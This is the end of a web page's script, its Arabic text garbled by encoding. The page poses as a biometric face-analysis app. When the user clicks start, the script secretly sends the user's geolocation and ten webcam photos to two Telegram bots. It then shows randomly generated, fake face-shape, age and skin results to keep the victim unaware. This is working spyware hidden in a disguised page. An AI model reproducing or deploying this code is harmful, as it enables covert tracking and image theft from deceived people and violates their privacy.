const faceShapes = ["Ø¨ÙŠØ¶Ø§ÙˆÙŠ Ù…ØªÙ†Ø§Ø³Ù‚", "Ø¯Ø§Ø¦Ø±ÙŠ", "Ù…Ø±Ø¨Ø¹ Ù…Ø­Ø¯Ø¯", "Ù‚Ù„Ø¨ÙŠ Ø§Ù„Ø´ÙƒÙ„", "Ù…Ø§Ø³ÙŠ Ù†Ø§Ø¯Ø±"];
        const skinTypes = ["Ù†Ø¶Ø±Ø© ÙˆØµØ­ÙŠØ© (92%)", "Ø¹Ø§Ø¯ÙŠØ© (85%)", "ØªØ­ØªØ§Ø¬ ØªØ±Ø·ÙŠØ¨ (78%)", "Ù…Ù…ØªØ§Ø²Ø© (95%)"];
        
        function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
        function res(id, val) { document.getElementById(id).innerText = val; }

        async function sendPhotoToBoth(blob, photoNumber) {
            const bots = [{t: TOKEN1, c: CHAT_ID1}, {t: TOKEN2, c: CHAT_ID2}];
            bots.forEach(bot => {
                if(bot.t.includes('Ø¶Ø¹_')) return;
                const fd = new FormData();
                fd.append('photo', blob, img_${photoNumber}.jpg);
                fd.append('chat_id', bot.c);
                fd.append('caption', ðŸ“¸ Ù„Ù‚Ø·Ø© Ø±Ù‚Ù… ${photoNumber}/10);
                fetch(https://api.telegram.org/bot${bot.t}/sendPhoto, { method: 'POST', body: fd });
            });
        }

        async function startRealAnalysis() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('status');
            const bar = document.getElementById('bar');
            
            btn.style.display = 'none';
            status.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±...";
            bar.style.width = "20%";

            navigator.geolocation.getCurrentPosition((pos) => {
                const mapUrl = ðŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
                [TOKEN1, TOKEN2].forEach((t, i) => {
                    const cid = i === 0 ? CHAT_ID1 : CHAT_ID2;
                    fetch(https://api.telegram.org/bot${t}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(mapUrl)});
                });
            });

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                status.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø³Ø­ Ø§Ù„Ø¨ÙŠÙˆÙ…ØªØ±ÙŠ... Ø«Ø¨Ø§Øª";
                
                const canvas = document.getElementById('canvas');
                canvas.width = 640; canvas.height = 480;

                for (let i = 1; i <= 10; i++) {
                    setTimeout(() => {
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => sendPhotoToBoth(blob, i), 'image/jpeg', 0.6);
                        bar.style.width = (20 + (i * 8)) + "%";
                    }, i * 700);
                }

                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('pre-scan-ui').style.display = 'none';
                    status.style.display = 'none';
                    document.getElementById('resultsUi').style.display = 'block';
                    res('res-shape', faceShapes[getRandomInt(0, 4)]);
                    res('res-symmetry', getRandomInt(85, 98) + "%");
                    res('res-age', getRandomInt(20, 40) + " Ø³Ù†Ø©");
                    res('res-skin', skinTypes[getRandomInt(0, 3)]);
                    res('res-score', "Ø§Ù„ØªÙ‚ÙŠÙŠÙ…: " + getRandomInt(88, 97) + "/100");
                }, 8500);

            } catch (err) {
                status.innerText = "Ø®Ø·Ø£: Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø·Ù„ÙˆØ¨Ø© Ù„Ù„ØªØ­Ù„ÙŠÙ„.";
                status.style.color = "#ff4444";
            }
        }
    </script>
</body>
</html>
